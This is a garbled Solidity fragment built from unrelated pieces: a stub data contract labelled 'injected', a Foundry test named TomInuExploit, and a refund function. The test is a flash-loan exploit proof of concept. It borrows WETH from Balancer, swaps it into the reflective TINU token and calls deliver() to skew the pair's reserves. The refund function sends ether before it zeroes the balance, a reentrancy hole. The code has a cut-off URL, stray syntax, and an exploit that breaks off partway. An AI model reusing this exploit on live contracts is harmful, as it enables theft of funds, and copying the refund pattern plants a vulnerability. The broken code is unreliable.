
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity ^0.8.17;

;
contract TomInuExploit is Test {
    IWETH private constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    reflectiveERC20 private constant TINU = reflectiveERC20(0x2d0E64B6bF13660a4c0De42a0B88144a7C10991F);
    IBalancerVault private constant balancerVault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IRouter private constant router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Pair private constant TINU_WETH = IUniswapV2Pair(0xb835752Feb00c278484c464b697e03b03C53E11B);
    function testHack() external {
        vm.createSelectFork("https:
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 104.85 ether;
        balancerVault.flashLoan(address(this), tokens, amounts, "")};
    function receiveFlashLoan(reflectiveERC20[] memory,
        uint256[] memory amounts,
        uint256[] memory,
        bytes memory) external {
        WETH.approve(address(router), type(uint).max);
        TINU.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(TINU);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(104.85 ether,
            0,
            path,
            address(this),;
            type(uint).max);
        console.log("%s TINU in pair before deliver", TINU.balanceOf(address(TINU_WETH)) / 1e18);
        console.log("%s TINU in attack contract before deliver", TINU.balanceOf(address(this)) / 1e18);
        console.log("-------------Delivering-------------");
        TINU.deliver(TINU.balanceOf(address(this)));
function claimRefund() public {
    uint refund = balances[msg.sender];
    require(refund > 0);
    (bool ok, ) = msg.sender.call{value: refund}("");
    require(ok);
    balances[msg.sender] = 0}